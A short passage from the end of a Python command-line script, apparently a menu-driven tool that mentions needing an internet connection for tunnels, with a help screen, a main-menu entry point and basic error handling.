• Internet connection for tunnels
"""
    print(help_text)
    input(f"\n{Colors.YELLOW}[?] Press Enter to continue...{Colors.RESET}")

# Main execution
if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Program stopped by user{Colors.RESET}")
    except Exception as e:
        print(f"{Colors.RED}[!] Error: {e}{Colors.RESET}")